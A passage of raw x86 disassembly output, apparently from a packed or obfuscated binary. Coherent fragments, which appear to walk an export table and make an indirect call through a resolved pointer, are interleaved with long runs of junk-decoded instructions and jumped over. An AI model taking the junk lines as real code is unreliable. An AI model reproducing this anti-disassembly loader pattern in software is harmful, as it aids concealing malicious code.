  41283d:	xchg   edi,eax
  41283e:	test   BYTE PTR [eax],al
  412840:	adc    ah,dh
  412842:	or     al,BYTE PTR [esi-0x23]
  412845:	loop   0x412828
  412847:	aas    
  412848:	out    dx,eax
  412849:	or     DWORD PTR [ebx+eax*2-0x6bc4275b],edx
  412850:	sbb    al,0x56
  412852:	int    0x2d
  412854:	push   edx
  412855:	dec    esi
  412856:	xor    eax,0x398fd1fd
  41285b:	mov    ds:0x9200d485,eax
  412860:	sub    al,BYTE PTR [esi+ebp*1+0x4330b93f]
  412867:	jne    0x412843
  412869:	mov    bh,0xc6
  41286b:	in     al,dx
  41286c:	div    BYTE PTR [edi-0x741fba77]
  412872:	inc    ebp
  412873:	loopne 0x4127fa
  412875:	ror    BYTE PTR [edi],0x85
  412878:	adc    al,BYTE PTR [eax]
  41287a:	add    BYTE PTR [eax],al
  41287c:	mov    eax,DWORD PTR [ebp-0x4]
  41287f:	inc    esi
  412880:	cmp    esi,DWORD PTR [eax+0x18]
  412883:	jne    0x41269f
  412889:	jmp    0x41289e
  41288e:	mov    eax,DWORD PTR [ebp-0x24]
  412891:	movzx  eax,WORD PTR [eax+esi*2]
  412895:	mov    ecx,DWORD PTR [ebp-0x28]
  412898:	mov    eax,DWORD PTR [ecx+eax*4]
  41289b:	mov    DWORD PTR [ebp-0x10],eax
  41289e:	mov    eax,DWORD PTR [ebp-0x10]
  4128a1:	test   eax,eax
  4128a3:	je     0x413004
  4128a9:	mov    eax,DWORD PTR [ebp-0x10]
  4128ac:	jmp    0x412988
  4128b1:	dec    esp
  4128b2:	loopne 0x4128c0
  4128b4:	cmp    ebp,DWORD PTR [edi+edi*8-0x18c50881]
  4128bb:	adc    DWORD PTR [edi+0x333d3f11],ecx
  4128c1:	sbb    ch,cl
  4128c3:	add    BYTE PTR [eax],al
  4128c5:	mov    edi,0xc0000000
  4128ca:	stc    
  4128cb:	or     eax,0xbd6256c
  4128d1:	add    BYTE PTR [ebx-0x3f],ah
  4128d4:	mov    edx,0x81bd942c
  4128d9:	or     eax,DWORD PTR [ebx]
  4128db:	adc    edi,edx
  4128dd:	cmp    DWORD PTR [ecx],ebx
  4128df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128e0:	dec    esp
  4128e1:	mov    ?,WORD PTR [ebx]
  4128e3:	push   eax
  4128e4:	repnz pop esp
  4128e6:	sti    
  4128e7:	repnz pop edi
  4128e9:	xchg   DWORD PTR [ebp+0x7e],ebp
  4128ec:	daa    
  4128ed:	sub    ebx,eax
  4128ef:	ret    
  4128f0:	out    0x64,al
  4128f2:	mov    al,0x42
  4128f4:	xor    eax,0x382a2a46
  4128f9:	int    0x3f
  4128fb:	ja     0x412978
  4128fd:	inc    edi
  4128fe:	mov    edi,ecx
  412900:	ret    
  412901:	ja     0x412932
  412903:	mov    dl,0x8c
  412905:	mov    dl,0x93
  412907:	push   ebx
  412908:	jb     0x4128a6
  41290a:	(bad)  
  41290b:	in     eax,0x47
  41290d:	repnz push edx
  41290f:	mov    ch,0xb5
  412911:	dec    edi
  412912:	xor    ebx,DWORD PTR [ebp+esi*4+0x25]
  412916:	pop    edi
  412917:	es dec esp
  412919:	fcomp  DWORD PTR [edi+0x1bbfd580]
  41291f:	test   al,0x80
  412921:	test   BYTE PTR ds:0xa44a50e2,0x67
  412928:	mov    esi,DWORD PTR [esi+0x57aac1de]
  41292e:	pop    ds
  41292f:	bound  eax,QWORD PTR [edx+0x49]
  412932:	jbe    0x4128d2
  412934:	mov    BYTE PTR [edi+0x3e],ch
  412937:	sbb    cl,0x16
  41293a:	sub    eax,0x1613918
  41293f:	and    DWORD PTR [ecx-0x11],edi
  412942:	mov    eax,ds:0x4a334e41
  412947:	or     BYTE PTR [esi],al
  412949:	xchg   ebp,eax
  41294a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41294b:	loope  0x412996
  41294d:	pop    ds
  41294e:	cmp    cl,bl
  412950:	push   cs
  412951:	repnz cmp eax,0xdb411fb2
  412957:	inc    ecx
  412958:	push   ds
  412959:	test   bl,0x20
  41295c:	in     eax,0x2
  41295e:	inc    edx
  41295f:	imul   edi,DWORD PTR [ebx],0x5f
  412962:	data16 or al,0xcb
  412965:	jnp    0x41295a
  412967:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412969:	test   DWORD PTR [edx+0x18],esi
  41296c:	inc    eax
  41296d:	sub    al,BYTE PTR [esi+0x28ec3178]
  412973:	das    
  412974:	ret    0xbe77
  412977:	mov    dh,0x32
  412979:	cwde   
  41297a:	inc    ecx
  41297b:	(bad)  
  41297c:	jns    0x41292e
  41297e:	sbb    al,BYTE PTR [edx+edx*2]
  412981:	outs   dx,DWORD PTR ds:[esi]
  412982:	ss mov esi,0x41c9158c
  412988:	add    eax,DWORD PTR [ebp+0x8]
  41298b:	mov    DWORD PTR [ebp-0x48],eax
  41298e:	mov    DWORD PTR [ebp+0xc],edi
  412991:	mov    eax,DWORD PTR [ebp-0x8]
  412994:	test   eax,eax
  412996:	je     0x412e31
  41299c:	jmp    0x412a78
  4129a1:	xor    ebp,DWORD PTR [ecx]
  4129a3:	es clc 
  4129a5:	ds (bad) 
  4129a7:	(bad)  
  4129a8:	jmp    0x4129a0
  4129aa:	xor    esi,DWORD PTR [edx+0x67]
  4129ad:	pop    ebp
  4129ae:	add    eax,0xcdd7bb5a
  4129b3:	add    BYTE PTR [eax],al
  4129b5:	mov    edi,0x89000000
  4129ba:	stc    
  4129bb:	jne    0x4129bf
  4129bd:	pop    ebx
  4129be:	arpl   WORD PTR [ebx-0x5a],di
  4129c1:	push   0x4f
  4129c3:	(bad)  
  4129c4:	mov    DWORD PTR [ecx+eax*4+0x77],edi
  4129c8:	dec    edi
  4129c9:	cmp    ch,BYTE PTR [ebp+ebx*8+0x33]
  4129cd:	mov    es,esi
  4129cf:	jl     0x4129b7
  4129d1:	adc    eax,0x5f8240d2
  4129d6:	dec    esp
  4129d7:	neg    DWORD PTR [ecx-0x44de3951]
  4129dd:	xchg   edx,eax
  4129de:	in     al,dx
  4129df:	add    ah,cl
  4129e1:	(bad)  
  4129e2:	mov    edi,0x833cb5e3
  4129e7:	mov    al,ds:0xf088f7a6
  4129ec:	mov    ecx,0x31c5194d
  4129f1:	test   DWORD PTR [esi+0x4],edi
  4129f4:	sub    eax,0x7228180
  4129f9:	inc    ebx
  4129fa:	into   
  4129fb:	imul   ch
  4129fd:	xchg   esp,eax
  4129fe:	xchg   esp,eax
  4129ff:	sahf   
  412a00:	xor    al,0x9f
  412a02:	jbe    0x4129fe
  412a04:	fsubr  QWORD PTR [esi+0x4b060c78]
  412a0a:	xlat   BYTE PTR ds:[ebx]
  412a0b:	fstp   QWORD PTR [ebp+0xdefb1c4]
  412a11:	punpcklwd mm0,DWORD PTR [ecx+0x4e989f34]
  412a18:	in     eax,dx
  412a19:	fcomp  DWORD PTR [esi+0x8]
  412a1c:	push   ds
  412a1d:	push   0x30
  412a1f:	mov    bh,0xdd
  412a21:	iret   
  412a22:	fwait
  412a23:	into   
  412a24:	and    eax,0xa9efcecd
  412a29:	cmp    BYTE PTR [edx-0x2d],bl
  412a2c:	fst    DWORD PTR [ebx-0x40767a9b]
  412a32:	in     al,dx
  412a33:	cs enter 0x3887,0x3d
  412a38:	sbb    al,0x20
  412a3a:	je     0x412a70
  412a3c:	jmp    esp
  412a3e:	idiv   DWORD PTR [esi-0x6]
  412a41:	xor    edx,esp
  412a43:	js     0x412ac1
  412a45:	in     al,dx
  412a46:	xchg   ebp,eax
  412a47:	iret   
  412a48:	xor    esp,DWORD PTR [edx]
  412a4a:	ins    BYTE PTR es:[edi],dx
  412a4b:	and    al,0x67
  412a4d:	xchg   DWORD PTR [esi],ecx
  412a4f:	(bad)  
  412a50:	shl    BYTE PTR [eax*4+0x387fef5f],cl
  412a57:	add    DWORD PTR [ebp-0x44],edi
  412a5a:	repnz sbb bl,BYTE PTR [ebp-0x6219fff1]
  412a61:	cmp    esi,DWORD PTR [eax-0x2a]
  412a64:	pop    esp
  412a65:	pop    esp
  412a66:	out    dx,al
  412a67:	inc    ebp
  412a68:	dec    ecx
  412a69:	out    0x47,al
  412a6b:	push   ds
  412a6c:	sahf   
  412a6d:	push   esi
  412a6e:	out    0xe3,al
  412a70:	scas   eax,DWORD PTR es:[edi]
  412a71:	push   edi
  412a72:	mov    bh,0x40
  412a74:	xlat   BYTE PTR ds:[ebx]
  412a75:	cmp    DWORD PTR [edx],edi
  412a77:	inc    esi
  412a78:	mov    eax,DWORD PTR [ebp-0x8]
  412a7b:	test   eax,eax
  412a7d:	je     0x412e31
  412a83:	mov    eax,DWORD PTR [ebp-0x8]
  412a86:	jmp    0x412b62
  412a8b:	div    BYTE PTR [ebx+0x40]
  412a8e:	add    ebp,eax
  412a90:	xor    esi,edi
  412a92:	idiv   DWORD PTR [ebp-0x33ca453]
  412a98:	inc    ebx
  412a99:	call   0xbf00:0xce96c4
  412aa0:	add    BYTE PTR [eax],al
  412aa2:	add    dh,cl
  412aa4:	retf   
  412aa5:	out    dx,eax
  412aa6:	in     al,dx
  412aa7:	mov    BYTE PTR [esi+0xf],bh
  412aaa:	ret    
  412aab:	ja     0x412b06
  412aad:	mov    esp,0x101f3edd
  412ab2:	in     eax,0xf1
  412ab4:	xchg   ebx,eax
  412ab5:	clc    
  412ab6:	push   edx
  412ab7:	or     BYTE PTR [ebp+ebx*1-0x52],0x81
  412abc:	loopne 0x412ae1
  412abe:	ins    BYTE PTR es:[edi],dx
  412abf:	mov    ?,ecx
  412ac1:	push   es
  412ac2:	jmp    0x412a51
  412ac4:	jbe    0x412b3c
  412ac6:	push   esi
  412ac7:	jge    0x412aa7
  412ac9:	ins    BYTE PTR es:[edi],dx
  412aca:	rcl    DWORD PTR ds:0x18e7350,0x27
  412ad1:	ins    BYTE PTR es:[edi],dx
  412ad2:	push   ebx
  412ad3:	ins    BYTE PTR es:[edi],dx
  412ad4:	and    eax,0x292e5250
  412ad9:	cmp    DWORD PTR [edi+0x7f],0x11933325
  412ae0:	scas   al,BYTE PTR es:[edi]
  412ae1:	fmul   st,st(1)
  412ae3:	repz rol BYTE PTR [ebp-0x28],cl
  412ae7:	mov    DWORD PTR [eax],eax
  412ae9:	pop    edi
  412aea:	jns    0x412b3a
  412aec:	cmp    BYTE PTR [esi],cl
  412aee:	arpl   WORD PTR [eax-0x2e],si
  412af1:	cli    
  412af2:	xchg   esp,eax
  412af3:	mov    esi,0x4e35b55b
  412af8:	add    bh,0x15
  412afb:	adc    edi,ecx
  412afd:	sbb    al,0x21
  412aff:	sbb    DWORD PTR [edi-0x308d542e],esi
  412b05:	jnp    0x412a9a
  412b07:	adc    esi,eax
  412b09:	gs and al,0xfd
  412b0c:	ss jecxz 0x412aaf
  412b0f:	push   es
  412b10:	add    al,0x5e
  412b12:	mov    al,0xb
  412b14:	pop    ebp
  412b15:	lods   al,BYTE PTR ds:[esi]
  412b16:	cdq    
  412b17:	fst    DWORD PTR [ebp-0x68014785]
  412b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b1e:	call   0x3cd09b4e
  412b23:	adc    ah,BYTE PTR [ecx+0x18b9494d]
  412b29:	jecxz  0x412b4a
  412b2b:	sbb    esp,DWORD PTR [esi+0x5ebab10d]
  412b31:	popf   
  412b32:	push   cs
  412b33:	push   ecx
  412b34:	push   eax
  412b35:	push   esi
  412b36:	loop   0x412b03
  412b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b39:	out    0xb0,al
  412b3b:	dec    ebp
  412b3c:	nop
  412b3d:	test   DWORD PTR [ebx-0x1284cff9],edx
  412b43:	rcl    BYTE PTR [edx+0x2c],1
  412b46:	mov    eax,ds:0xa4e58a5e
  412b4b:	rol    DWORD PTR [eax-0x66],cl
  412b4e:	cmp    al,0xd6
  412b50:	jnp    0x412bc5
  412b52:	xlat   BYTE PTR ds:[ebx]
  412b53:	mov    al,ds:0x227ed513
  412b58:	mov    ebp,0xd7643e46
  412b5d:	daa    
  412b5e:	push   edx
  412b5f:	retf   0x555c
  412b62:	shl    eax,0x2
  412b65:	mov    DWORD PTR [ebp+0xc],eax
  412b68:	jmp    0x412c44
  412b6d:	xchg   edx,eax
  412b6e:	add    al,0x32
  412b70:	(bad)  [esi+0x4f4dfbff]
  412b76:	test   eax,0xa7fb0d8a
  412b7b:	mov    ch,0x59
  412b7d:	push   ebp
  412b7e:	iret   
  412b7f:	add    BYTE PTR [eax],al
  412b81:	mov    edi,0xfc000000
  412b86:	add    ah,BYTE PTR [edx+ebx*8+0x52e82b10]
  412b8d:	push   ds
  412b8e:	out    dx,al
  412b8f:	fwait
  412b90:	cmp    ah,BYTE PTR [eax]
  412b92:	(bad)  
  412b93:	sub    cl,BYTE PTR [edi+0xd]
  412b96:	shr    DWORD PTR [ebp+0x22],0x3c
  412b9a:	fadd   DWORD PTR [edx+0x35]
  412b9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b9e:	in     al,dx
  412b9f:	add    eax,DWORD PTR [ecx]
  412ba1:	mov    edi,0x8067f326
  412ba6:	test   DWORD PTR cs:[edi+0x7ec8d4b7],ebp
  412bad:	loop   0x412b91
  412baf:	fild   DWORD PTR [eax*2+0x5c84dafe]
  412bb6:	cdq    
  412bb7:	pop    edx
  412bb8:	push   ss
  412bb9:	dec    ecx
  412bba:	call   0x690f030e
  412bbf:	out    dx,al
  412bc0:	sbb    eax,0xca432662
  412bc5:	ins    DWORD PTR es:[edi],dx
  412bc6:	retf   0x5fbc
  412bc9:	pop    esi
  412bca:	gs loope 0x412bcc
  412bcd:	jnp    0x412b5d
  412bcf:	mov    ebp,0x2a8b4f6a
  412bd4:	add    ebx,DWORD PTR es:[edi+edx*1+0x5419d00c]
  412bdc:	add    DWORD PTR [esi+eax*1+0x19],ebp
  412be0:	loopne 0x412ba8
  412be2:	mov    edx,0xfadc4f1c
  412be7:	xlat   BYTE PTR ds:[ebx]
  412be8:	ficom  WORD PTR [ecx]
  412bea:	adc    ecx,DWORD PTR ds:0xabfed4aa
  412bf0:	dec    ebp
  412bf1:	lock push 0x227ed68c
  412bf7:	dec    ecx
  412bf8:	pop    ss
  412bf9:	and    bh,bh
  412bfb:	imul   esi,DWORD PTR [ebx-0x1c8d4a39],0xfffffffe
  412c02:	lds    ebx,FWORD PTR [ebp+edx*2+0x255338c7]
  412c09:	in     al,0x37
  412c0b:	(bad)  
  412c0c:	mov    BYTE PTR [ebp+0x43],ch
  412c0f:	push   ds
  412c10:	or     esp,edx
  412c12:	xchg   esp,eax
  412c13:	mov    bh,0x18
  412c15:	stc    
  412c16:	test   DWORD PTR ss:[esi],eax
  412c19:	jle    0x412c06
  412c1b:	xchg   edi,eax
  412c1c:	jle    0x412bd8
  412c1e:	inc    ebp
  412c1f:	std    
  412c20:	sub    eax,0x7dd941ab
  412c25:	gs popf 
  412c27:	retf   0x1661
  412c2a:	adc    eax,0x4e03847
  412c2f:	in     al,dx
  412c30:	daa    
  412c31:	(bad)  
  412c33:	in     eax,0x56
  412c35:	inc    esp
  412c36:	mov    ebp,0x228b0873
  412c3b:	ds lahf 
  412c3d:	mov    ebx,0xb2c27ad6
  412c42:	adc    ecx,DWORD PTR [edi-0x16138277]
  412c48:	xlat   BYTE PTR ds:[ebx]
  412c49:	add    BYTE PTR [eax],al
  412c4b:	add    al,ch
  412c4d:	sub    esi,esi
  412c4f:	mov    ch,0xf7
  412c51:	(bad)  
  412c52:	jmp    0x412cd1
  412c54:	ins    BYTE PTR es:[edi],dx
  412c55:	retf   0x5ff6
  412c58:	or     DWORD PTR [ebx-0x2feb9801],ebp
  412c5e:	add    BYTE PTR [eax],al
  412c60:	mov    edi,0xd2000000
  412c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c66:	sub    DWORD PTR ds:0xd95592f0,0xffffffe4
  412c6d:	sar    BYTE PTR ds:0x9989f71c,1
  412c73:	sbb    eax,ebx
  412c75:	loop   0x412c09
  412c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c78:	xor    al,0x7c
  412c7a:	inc    eax
  412c7b:	push   ds
  412c7c:	(bad)  
  412c7d:	jnp    0x412cb9
  412c7f:	fs test al,0x93
  412c82:	test   BYTE PTR [edx],cl
  412c84:	dec    esp
  412c85:	rcl    BYTE PTR [eax-0x4c],cl
  412c88:	xor    BYTE PTR [eax+0x76],ch
  412c8b:	test   BYTE PTR [eax+0x5e],0x84
  412c8f:	lods   eax,DWORD PTR ds:[esi]
  412c90:	xchg   edx,eax
  412c91:	push   ss
  412c92:	add    DWORD PTR [ebx],esi
  412c94:	inc    ecx
  412c95:	test   DWORD PTR [eax-0xc],ebx
  412c98:	nop
  412c99:	add    DWORD PTR [eax],edi
  412c9b:	push   ebp
  412c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c9d:	js     0x412c70
  412c9f:	shl    DWORD PTR [esi-0x3aed856b],1
  412ca5:	mov    edx,0xa818b1d1
  412caa:	xor    DWORD PTR [ecx+0x18],esp
  412cad:	jg     0x412cc8
  412caf:	shl    al,1
  412cb1:	mov    dl,BYTE PTR [esp+edi*2-0x23]
  412cb5:	sbb    al,0x84
  412cb7:	out    0x90,eax
  412cb9:	push   eax
  412cba:	retf   0xdb59
  412cbd:	hlt    
  412cbe:	jmp    0x62f6:0xd8a8413b
  412cc5:	enter  0x37a2,0xcd
  412cc9:	inc    edi
  412cca:	sub    DWORD PTR ss:[edx],0x0
  412cce:	pusha  
  412ccf:	mov    gs,WORD PTR [edx+0x3fcd8621]
  412cd5:	pop    ss
  412cd6:	push   ebx
  412cd7:	(bad)  
  412cd8:	data16 jae 0x412d5a
  412cdb:	mov    ecx,0x9620a390
  412ce0:	(bad)  
  412ce1:	mov    eax,0x34b84f49
  412ce6:	pushf  
  412ce7:	and    dh,al
  412ce9:	mov    WORD PTR ss:[edi-0x74],fs
  412ced:	push   esi
  412cee:	pop    esp
  412cef:	sub    eax,0xb037068
  412cf4:	clc    
  412cf5:	pop    ebp
  412cf6:	scas   al,BYTE PTR es:[edi]
  412cf7:	mul    BYTE PTR cs:0x7037957f
  412cfe:	adc    eax,0x9cdd0c0e
  412d03:	mov    edi,0x41d8b78c
  412d08:	jp     0x412d84
  412d0a:	stos   BYTE PTR es:[edi],al
  412d0b:	lahf   
  412d0c:	das    
  412d0d:	xchg   ebp,eax
  412d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d0f:	test   DWORD PTR ds:0x1a5f01e,esi
  412d15:	loop   0x412caf
  412d17:	out    dx,al
  412d18:	loopne 0x412cc1
  412d1a:	xchg   ebp,eax
  412d1b:	xchg   BYTE PTR [edx+ebp*2+0x26],al
  412d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d20:	mov    ah,0x8a
  412d22:	shr    BYTE PTR [ebx],0x65
  412d25:	or     al,0x89
  412d27:	gs in  al,dx
  412d29:	mov    DWORD PTR [ebp+0x8],edi
  412d2c:	jmp    0x412e23
  412d31:	mov    eax,DWORD PTR [ebp+0x8]
  412d34:	mov    ecx,DWORD PTR [ebp-0x14]
  412d37:	mov    edx,DWORD PTR [ebp+0x8]
  412d3a:	mov    esi,DWORD PTR [ebp+0x14]
  412d3d:	jmp    0x412e19
  412d42:	xor    BYTE PTR [ebp-0x20a5330],al
  412d48:	jl     0x412ce7
  412d4a:	mov    ah,0xe1
  412d4c:	fnsave [eax+0x72]
  412d4f:	cmp    al,0x9
  412d51:	xor    edx,ebx
  412d53:	rol    BYTE PTR [eax],1
  412d55:	add    BYTE PTR [edi-0x21000000],bh
  412d5b:	es ds or al,0xf6
  412d5f:	or     al,0x63
  412d61:	sbb    DWORD PTR [edi],ebp
  412d63:	out    0x1,al
  412d65:	adc    DWORD PTR [edi],esi
  412d67:	sub    eax,ebp
  412d69:	call   0x8667:0xac3e7ae0
  412d70:	xor    eax,0x84cf97b0
  412d75:	mov    bl,0x11
  412d77:	(bad)  
  412d78:	aas    
  412d79:	int    0xcc
  412d7b:	stos   BYTE PTR es:[edi],al
  412d7c:	mov    esp,0x14c9a44d
  412d81:	out    0x53,eax
  412d83:	in     eax,dx
  412d84:	gs jmp 0xaaa447d0
  412d8a:	ficom  DWORD PTR [esi+esi*1+0x17]
  412d8e:	sbb    eax,0x1bfaf435
  412d93:	push   eax
  412d94:	data16 jle 0x412da6
  412d97:	pushf  
  412d98:	push   eax
  412d99:	xchg   BYTE PTR [eax-0x41d715f4],bl
  412d9f:	inc    eax
  412da0:	cwde   
  412da1:	jbe    0x412df3
  412da3:	or     al,bh
  412da5:	push   ds
  412da6:	dec    ecx
  412da7:	fild   QWORD PTR [edi]
  412da9:	mov    WORD PTR [ebp+eax*8-0x6f],ds
  412dad:	adc    dl,bl
  412daf:	iret   
  412db0:	or     al,0x21
  412db2:	cmp    ecx,DWORD PTR [ecx+ecx*2-0x488d6cdb]
  412db9:	aam    0x30
  412dbb:	and    BYTE PTR [edx+0x582931],dl
  412dc1:	xchg   BYTE PTR [ecx-0x1f3196e8],ah
  412dc7:	outs   dx,BYTE PTR ds:[esi]
  412dc8:	add    eax,DWORD PTR [ebx-0x2c]
  412dcb:	sub    ebp,ecx
  412dcd:	xchg   ecx,eax
  412dce:	in     al,0x33
  412dd0:	loopne 0x412e02
  412dd2:	mov    bl,0xc0
  412dd4:	ins    BYTE PTR es:[edi],dx
  412dd5:	jle    0x412e13
  412dd7:	cmp    BYTE PTR [esi+0x73b5924],0xd3
  412dde:	dec    esp
  412ddf:	adc    al,0x5d
  412de1:	ins    BYTE PTR es:[edi],dx
  412de2:	mov    edi,0xb108d775
  412de7:	xor    al,bh
  412de9:	dec    edx
  412dea:	jns    0x412de5
  412dec:	sub    eax,DWORD PTR [esi+0x39]
  412def:	sub    esp,esi
  412df1:	jmp    0x6f0d0d67
  412df6:	mov    edx,DWORD PTR [esp+esi*1]
  412df9:	loope  0x412dc6
  412dfb:	test   BYTE PTR [ebx+0x1e],al
  412dfe:	es test eax,0xc0349c5
  412e04:	cli    
  412e05:	push   ebx
  412e06:	or     ch,0x5e
  412e09:	iret   
  412e0a:	in     al,0x93
  412e0c:	fidivr WORD PTR [edx+0x755084b6]
  412e12:	xchg   edi,eax
  412e13:	int    0xff
  412e15:	jbe    0x412e28
  412e17:	bnd jg 0x412da5
  412e1a:	push   esp
  412e1b:	xchg   esi,eax
  412e1c:	add    al,0x89
  412e1e:	adc    al,0x81
  412e20:	inc    DWORD PTR [ebp+0x8]
  412e23:	mov    eax,DWORD PTR [ebp+0x8]
  412e26:	mov    ecx,DWORD PTR [ebp-0x8]
  412e29:	cmp    eax,ecx
  412e2b:	jne    0x412d31
  412e31:	mov    DWORD PTR [ebp-0xc],edi
  412e34:	call   DWORD PTR [ebp-0x48]
  412e37:	xor    ebx,ebx
  412e39:	inc    ebx
  412e3a:	cmp    DWORD PTR [ebp+0x10],ebx
  412e3d:	je     0x412f22
  412e43:	add    esp,DWORD PTR [ebp+0xc]
  412e46:	jmp    0x412f22
  412e4b:	adc    DWORD PTR [esi],esp
  412e4d:	or     dl,BYTE PTR [edx]
  412e4f:	aas    
  412e50:	sbb    DWORD PTR ds:[edi],esp
  412e53:	mov    edx,0x7238feb1
  412e58:	in     eax,dx
  412e59:	xchg   edi,eax
  412e5a:	ficom  DWORD PTR [edx-0x40ffff2f]
  412e60:	add    BYTE PTR [eax],al
  412e62:	add    cl,bh
  412e64:	push   esp
  412e65:	push   edi
  412e66:	fild   QWORD PTR ds:0x52985128
  412e6c:	xlat   BYTE PTR ds:[ebx]
  412e6d:	sub    DWORD PTR ds:0x3518908a,ebx
  412e73:	inc    edi
  412e74:	pop    esi
  412e75:	jle    0x412e57
  412e77:	jnp    0x412ee8
  412e79:	test   al,dl
  412e7b:	mov    dh,0xc0
  412e7d:	arpl   WORD PTR [edx-0x207bf2c0],dx
  412e83:	push   edx
  412e84:	retf   
  412e85:	repnz ficomp WORD PTR [eax-0x4b48c1dc]
  412e8c:	dec    ebp
  412e8d:	ds scas al,BYTE PTR es:[edi]
  412e8f:	dec    esp
  412e90:	ss mov dl,0x5e
  412e93:	mov    dl,0xd4
  412e95:	inc    esi
  412e96:	add    DWORD PTR [edi+0x0],edi
  412e99:	jecxz  0x412eb2
  412e9b:	inc    eax
  412e9c:	int3   
  412e9d:	push   cs
  412e9e:	xchg   edi,eax
  412e9f:	dec    eax
  412ea0:	inc    ecx
  412ea1:	mov    al,0x78
  412ea3:	aaa    
  412ea4:	nop
  412ea5:	scas   al,BYTE PTR es:[edi]
  412ea6:	cdq    
  412ea7:	xchg   WORD PTR [ecx-0x6c7bbea6],ax
  412eae:	scas   al,BYTE PTR es:[edi]
  412eaf:	xchg   ecx,eax
  412eb0:	xor    al,ch
  412eb2:	sbb    eax,0xc42d54a
  412eb7:	xor    ah,bl
  412eb9:	outs   dx,BYTE PTR ds:[esi]
  412eba:	clc    
  412ebb:	dec    esp
  412ebc:	repnz xchg bl,al
  412ebf:	push   eax
  412ec0:	mov    ecx,0x7962f9e
  412ec5:	push   ebx
  412ec6:	loop   0x412eeb
  412ec8:	(bad)  
  412ec9:	and    al,0xfa
  412ecb:	sub    edx,DWORD PTR [ebp-0x42]
  412ece:	xor    BYTE PTR [ebx+ebx*1],bh
  412ed1:	push   esp
  412ed2:	rol    DWORD PTR [eax+0x197ade77],0x2
  412ed9:	or     DWORD PTR [eax-0xccfa396],esi
  412edf:	sbb    al,0xed
  412ee1:	fisub  WORD PTR [edx]
  412ee3:	retf   
  412ee4:	xchg   ebx,eax
  412ee5:	aas    
  412ee6:	push   ebx
  412ee7:	xchg   esp,eax
  412ee8:	add    DWORD PTR [bp+di-0x13],esp
  412eec:	int3   
  412eed:	sub    cl,dh
  412eef:	ficom  DWORD PTR [edi+0x6be97f61]
  412ef5:	popf   
  412ef6:	shr    dl,cl
  412ef8:	or     BYTE PTR [edx],cl
  412efa:	outs   dx,DWORD PTR ds:[esi]
  412efb:	and    al,0xf0
  412efd:	adc    bl,BYTE PTR [esi+edi*1+0x7d565fc]
  412f04:	mov    ecx,0x9818ea0b
  412f09:	and    DWORD PTR [ebp-0x66],edi
  412f0c:	inc    ebp
  412f0d:	ss loope 0x412ec1
  412f10:	(bad)  
  412f11:	mov    esi,0xdf5fecb1
  412f16:	sub    DWORD PTR [ebx+0x2ae8bcda],0xffffffad
  412f1d:	retf   0xfc3f
  412f20:	and    DWORD PTR [edx-0x77],esp
  412f23:	inc    ebp
  412f24:	hlt    
  412f25:	jmp    0x413001
  412f2a:	out    dx,eax
  412f2b:	imul   edi,DWORD PTR [ecx+0x13],0xfffffffd
  412f2f:	adc    ebp,edi
  412f31:	jmp    FWORD PTR [edi+ebp*2+0x12]
  412f35:	add    bh,BYTE PTR [esi]
  412f37:	aaa    
  412f38:	xor    eax,0xd2516e
  412f3d:	add    BYTE PTR [edi+0x2d000000],bh
  412f43:	push   eax
  412f44:	mov    WORD PTR [esp+eiz*8],?
  412f47:	add    bl,BYTE PTR [edi]
  412f49:	into   
  412f4a:	call   0x27b94f8d
  412f4f:	sub    BYTE PTR [ebx],bh
  412f51:	xor    DWORD PTR [eax+eax*1],0xf131e445
  412f58:	sub    al,0x36
  412f5a:	xlat   BYTE PTR ds:[ebx]
  412f5b:	or     eax,ebp
  412f5d:	jp     0x412fda
  412f5f:	lock enter 0xb420,0x35
  412f64:	or     dl,BYTE PTR [edx]
  412f66:	sub    cl,al
  412f68:	push   ebp
  412f69:	retf   
  412f6a:	adc    al,ah
  412f6c:	sahf   
  412f6d:	or     esi,DWORD PTR [edi]
  412f6f:	xchg   esp,eax
  412f70:	pop    esi
  412f71:	lahf   
  412f72:	push   ds
  412f73:	mov    ebx,0x16334fe2
  412f78:	xlat   BYTE PTR cs:[ebx]
  412f7a:	jno    0x412fcc
  412f7c:	jge    0x412feb
  412f7e:	in     al,0x16
  412f80:	sub    esp,DWORD PTR [ebp-0x73d92572]
  412f86:	add    DWORD PTR [edx],0xffffffeb
  412f89:	sahf   
  412f8a:	sar    DWORD PTR [edx+0x2d],0x43
  412f8e:	fwait
  412f8f:	sahf   
  412f90:	jmp    0xf8a5:0x736bfbaf
  412f97:	mov    edx,0x628baf22
  412f9c:	jne    0x412fee
  412f9e:	call   0x1e0d:0x49424bc4
  412fa5:	push   edi
  412fa6:	leave  
  412fa7:	test   al,0xf5
  412fa9:	popf   
  412faa:	call   0xf853:0x7fa63f87
  412fb1:	dec    esi
  412fb2:	stc    
  412fb3:	mov    WORD PTR [edi],ss
  412fb5:	loope  0x412f94
  412fb7:	xor    BYTE PTR [ecx-0x5254b608],0x26
  412fbe:	and    BYTE PTR ds:0x80f74a9b,ah
  412fc4:	pop    es
  412fc5:	jg     0x412fd9
  412fc7:	sub    BYTE PTR [eax+0x57],bh
  412fca:	data16 je 0x412ff9
  412fcd:	cmp    eax,0x4daf703d
  412fd2:	dec    ebp
  412fd3:	sub    al,0xc
  412fd5:	ss jmp 0x2aa719d7
  412fdb:	retf   
  412fdc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  412fde:	adc    ah,BYTE PTR ds:0x98af8af2
  412fe4:	into   
  412fe5:	jnp    0x412fbc
  412fe7:	sub    al,0xd3
  412fe9:	jae    0x413008
  412feb:	jno    0x412fd9
  412fed:	inc    esi
  412fee:	pop    ecx
  412fef:	pop    ss
  412ff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff1:	out    dx,eax
  412ff2:	mov    dh,0xcc
  412ff4:	daa    
  412ff5:	push   edx
  412ff6:	mov    eax,0x72520cd2
  412ffb:	mov    bh,0xce
